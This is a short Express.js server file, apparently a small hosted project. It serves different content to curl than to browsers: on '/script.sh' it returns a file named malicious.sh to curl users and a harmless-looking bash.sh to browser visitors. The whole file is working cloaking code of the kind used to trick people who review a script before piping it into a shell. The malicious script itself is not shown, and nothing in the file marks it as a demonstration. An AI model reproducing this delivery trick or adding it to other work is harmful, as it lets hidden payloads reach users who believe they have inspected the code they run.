// index.js
// where your node app starts
require('dotenv').config();
// init project
const express = require('express');
const app = express();

app.get('/', function(request, response) {
  console.log("Accessed '/'")
  if (request.header('User-Agent').includes('curl')){
    response.sendFile(__dirname + '/views/curl.html'); 
  }
  else {
    response.sendFile(__dirname + '/views/index.html');
  }
});

app.get('/script.sh', function(request, response) {
  console.log("Accessed '/script.sh'")
  if (request.header('User-Agent').includes('curl')){
    response.sendFile(__dirname + '/scripts/malicious.sh'); 
  }
  else {
    response.type('text').sendFile(__dirname + '/scripts/bash.sh');
  }
});

const listener = app.listen(process.env.PORT, function() {
  console.log('Your app is listening on port ' + listener.address().port);
});
